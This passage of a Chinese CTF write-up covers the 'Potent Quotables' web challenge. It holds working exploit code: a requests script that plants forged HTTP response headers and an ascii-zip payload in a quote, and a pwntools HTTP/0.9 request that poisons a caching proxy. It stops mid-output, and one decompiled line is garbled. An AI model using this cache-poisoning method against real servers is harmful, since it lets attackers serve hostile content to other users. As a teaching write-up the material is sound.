## 0x1 前言
国际赛就是好玩，这两个web题目都还挺有意思的，目前还没有官方的writeup放出，只放出了exp  
,感兴趣的可以去看看这个两个题目。
此writeup同步发布在我的博客上:
第一个web题目:
    potent Quotables 
    Web (300 pts)
    I set up a little quotes server so that we can all share our favorite quotes with each other. I wrote it in Flask, but I decided that since it's mostly static content anyway, I should probably put some kind of caching layer in front of it, so I wrote a caching reverse proxy. It all seems to be working well, though I do get this weird error when starting up the server: 
    * Environment: production
        WARNING: Do not use the development server in a production environment.
        Use a production WSGI server instead.
    I'm sure that's not important. 
    Oh, and don't bother trying to go to the /admin page, that's not for you.
    No solvers yet
    http://quotables.pwni.ng:1337/
第二个web题目:
    I stared into the abyss of microservices, and it stared back. I found something utterly terrifying about the chaos of connections. 
    "Screw this," I finally declared, "why have multiple services when the database can do everything just fine on its own?" 
    And so on that glorious day it came to be that everything ran in plpgsql.
    http://triggered.pwni.ng:52856/
本文章就是基于这个exp还有我们当时的做题的一些想法，来讲解一下这两个题目中用到的知识。
## 0x2 Potent Quotables
### 题目功能简单说明
根据题目提示，这是用flask写的web服务，并且他直接使用的是 `flask's built-in
server`,并没有使用flask的一些生产环境的部署方案。  
题目的功能也比较简单主要有如下功能：
    1. 创建Quote
    2. 查看Quote 
    3. 给Quote投票
    4. 发送一个链接给管理员，发起一个report
    5. 查看提交给管理员的report，是否被管理员处理
主要的API接口如下：
    http://quotables.pwni.ng:1337/api/featured  # 查看所有的note,支持GET和POST
    http://quotables.pwni.ng:1337/api/quote/62a2d9ef-63d5-4cdf-83c7-f8b0aad8e18e  #查看一个note，支持GET和POST
    http://quotables.pwni.ng:1337/api/score/ba7a0334-2843-4f5e-b434-a85f06d790f1  # 查看一个note现在的票数，支持GET和POST
    http://quotables.pwni.ng:1337/api/report/66fa60f2-efee-4b7d-96ab-4c557fbee63a # 查看某个report现在的状态，支持GET和POST
    http://quotables.pwni.ng:1337/api/flag    # 获取flag的api，只能管理员通过POST访问
功能性的页面有如下
    http://quotables.pwni.ng:1337/quote#c996b56d-f6de-4ce1-8288-939ed2b381f3
    http://quotables.pwni.ng:1337/report#9bd72d5e-4e6b-4c4e-985a-978fc30ff491
    http://quotables.pwni.ng:1337/quotes/new
    http://quotables.pwni.ng:1337/
创建的quote都是被html实体编码的，web层面上没有什么问题,但是题目还给提供了一个二进制，是一个具有缓存功能的代理，看一下主要功能。
### 发生缓存和命中缓存的时机
下面简单看一下二进制部分的代码(不要问我怎么逆的，全是队友的功劳):
main函数里面,首先监听端口，然后进入`while True`的循环，不停的从接受socket连接，开启新的线程处理发来的请求  
下面看处理请求的过程：  
首先获取用户请求的第一行，然后用空格分割，分别存储请求类型，请求路径和HTTP的版本信息。
接下来去解析请求头，每次读取一行，用 : 分割，parse 请求头。
    while ( 1 )                                   // parse headers
      {
        while ( 1 )
        {
          n = get_oneline((__int64)reqbodycontentbuffer, &buf_0x2000, 8192uLL);
          if ( (n & 0x8000000000000000LL) != 0LL )
          {
            fwrite("IO Error: readline failed.  Exiting.\n", 1uLL, 0x25uLL, stderr);
            exit(2);
          }
          if ( n != 8191 )
            break;
          flag = 1;
        }
        if ( (signed __int64)n ,很关键的一点是http/0.9没有请求体，响应头的概念。  
可以看一下简单的例子，我用flask's built-in server起了一个web服务：
    ➜  ~ nc  127.0.0.1 5000
    GET / HTTP/0.9
    Hello World!%
可以看到直接返回了ascii内容，没有响应头等复杂的东西。
到这里我才终于明白，题目中的提示是啥意思，为啥他要用`flask's built-in server`了，因为只有这玩意才支持 http/0.9,
比如我们使用http/0.9访问apache，和nginx,发现都会返回400
    ➜  ~ nc 127.0.0.1 80
    GET / HTTP/0.9
    HTTP/1.1 400 Bad Request
    Date: Mon, 15 Apr 2019 08:22:06 GMT
    Server: Apache/2.4.34 (Unix)
    Content-Length: 226
    Connection: close
    Content-Type: text/html; charset=iso-8859-1
    400 Bad Request
    Bad Request
    Your browser sent a request that this server could not understand.
    ➜  ~ nc 127.0.0.1 8081
    GET / HTTP/0.9
    HTTP/1.1 400 Bad Request
    Server: nginx/1.15.3
    Date: Mon, 15 Apr 2019 08:22:37 GMT
    Content-Type: text/html
    Content-Length: 173
    Connection: close
    400 Bad Request
    400 Bad Request
    nginx/1.15.3
我们可以利用 http/0.9 没有响应头的只有响应体的特点，去进行缓存投毒。但是响应被cache有一个条件，就是响应必须是 `HTTP/1.0 200
OK` 的，所以正常的 http/0.9 的响应是没有办法被cache的，不过绕过很简单，我们不是可以控制响应体吗？ 在响应体里面伪造一个就好了。
伪造一个quote:
    headers = {
        'Origin': 'http://quotables.pwni.ng:1337',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
    }
    # just using ascii-zip
    wow = 'D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4'
    data = {
      'quote': 'HTTP/1.0 200 OK\r\nHTTP/1.0 302 OK\r\nContent-Encoding: deflate\r\nContent-Type: text/html;\r\nContent-Lexngth: {length}\r\n\r\n'.format(length=len(wow)) + wow,
      'attribution': ''
    }
    response = requests.post('http://quotables.pwni.ng:1337/quotes/new', headers=headers, data=data)
    key = response.history[0].headers['Location'].split('quote#')[1]
    print(key)
此时这个quote的内容如下：
    ➜  ~ http -v  http://quotables.pwni.ng:1337/api/quote/b4ed6ec7-ca25-47a8-bc9a-0af477e805ad
    GET /api/quote/b4ed6ec7-ca25-47a8-bc9a-0af477e805ad HTTP/1.1
    Accept: */*
    Accept-Encoding: gzip, deflate
    Connection: keep-alive
    Host: quotables.pwni.ng:1337
    User-Agent: HTTPie/0.9.9
    HTTP/1.0 200 OK
    Content-Length: 272
    Content-Security-Policy: default-src 'none'; script-src 'nonce-N1Y7jw0BZ4o6qEL3UsNEJQ=='; style-src 'self'; img-src 'self'; connect-src 'self'
    Content-Type: text/plain; charset=utf-8
    Date: Mon, 15 Apr 2019 08:33:07 GMT
    Server: Werkzeug/0.15.2 Python/3.6.7
    HTTP/1.0 200 OK
    HTTP/1.0 302 OK
    Content-Encoding: deflate
    Content-Type: text/html;
    Content-Lexngth: 158
    D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4
    -
下面开始缓存投毒：
    from pwn import *
    # 
    r = remote('quotables.pwni.ng', 1337)
    r.sendline('''GET /api/quote/{target} HTTP/0.9
    Connection: keep-alive
    Host: quotables.pwni.ng:1337
    Range: bytes=0-2
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Content-Transfer-Encoding: BASE64
    Accept-Charset: iso-8859-15
    Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
    Proxy-Connection: close
    '''.replace('\n', '\r\n').format(target=key))
    r.close()
进行缓存投毒之后，此quote的响应如下：
    ~ curl -v  http://quotables.pwni.ng:1337/api/quote/babead1b-05df-45a8-8c39-c04212b52bba
    *   Trying 35.199.45.210...
    * TCP_NODELAY set
    * Connected to quotables.pwni.ng (35.199.45.210) port 1337 (#0)